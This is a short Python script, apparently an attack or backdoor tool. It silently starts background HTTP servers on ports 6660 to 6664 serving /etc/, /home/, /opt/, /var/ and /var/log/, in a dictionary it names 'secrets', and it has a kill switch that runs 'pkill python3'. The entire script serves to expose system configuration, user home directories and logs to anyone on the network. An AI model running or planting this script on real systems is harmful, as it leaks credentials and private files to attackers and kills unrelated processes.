#!/usr/bin/env python3

import argparse
import os

def open_ports():
    secrets = {
        0:"/etc/",
        1:"/home/",
        2:"/opt/",
        3:"/var/",
        4:"/var/log/"
    }

    for number in range(5):
        directory = secrets.get(number)
        cmd = "python3 -m http.server 666%d > /dev/null &" % number
        os.chdir(directory)
        os.system(cmd)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--kill-switch', action='store_true')
    args = parser.parse_args()

    if args.kill_switch:
        os.system("pkill python3 &")
    else:
        open_ports()
